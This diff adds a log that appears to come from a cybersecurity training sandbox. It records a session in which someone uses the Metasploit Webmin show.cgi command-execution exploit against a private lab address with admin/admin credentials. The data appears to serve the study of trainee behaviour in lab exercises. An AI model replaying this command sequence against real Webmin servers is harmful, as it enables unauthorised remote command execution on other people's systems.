@@ -1,0 +1,12 @@
+{"sandbox_id": "86", "timestamp_str": "2020-07-15T09:52:12.196974+02:00", "cmd_type": "msf-command", "cmd": "quit"}
+{"sandbox_id": "86", "timestamp_str": "2020-07-15T09:52:32.099676+02:00", "cmd_type": "msf-command", "cmd": "search webmin"}
+{"sandbox_id": "86", "timestamp_str": "2020-07-15T09:52:50.780111+02:00", "cmd_type": "msf-command", "cmd": "use exploit/unix/webapp/webmin_show_cgi_exec"}
+{"sandbox_id": "86", "timestamp_str": "2020-07-15T09:52:53.844049+02:00", "cmd_type": "msf-command", "cmd": "show"}
+{"sandbox_id": "86", "timestamp_str": "2020-07-15T09:52:56.884533+02:00", "cmd_type": "msf-command", "cmd": "show targets"}
+{"sandbox_id": "86", "timestamp_str": "2020-07-15T09:53:02.815114+02:00", "cmd_type": "msf-command", "cmd": "show options"}
+{"sandbox_id": "86", "timestamp_str": "2020-07-15T09:53:13.998623+02:00", "cmd_type": "msf-command", "cmd": "set RHOST 172.18.1.5"}
+{"sandbox_id": "86", "timestamp_str": "2020-07-15T09:53:29.872903+02:00", "cmd_type": "msf-command", "cmd": "set USERNAME dmin"}
+{"sandbox_id": "86", "timestamp_str": "2020-07-15T09:53:32.053563+02:00", "cmd_type": "msf-command", "cmd": "set USERNAME admin"}
+{"sandbox_id": "86", "timestamp_str": "2020-07-15T09:53:34.363683+02:00", "cmd_type": "msf-command", "cmd": "exploit"}
+{"sandbox_id": "86", "timestamp_str": "2020-07-15T09:53:45.794787+02:00", "cmd_type": "msf-command", "cmd": "set PASSWORD admin"}
+{"sandbox_id": "86", "timestamp_str": "2020-07-15T09:53:50.139023+02:00", "cmd_type": "msf-command", "cmd": "exploit"}
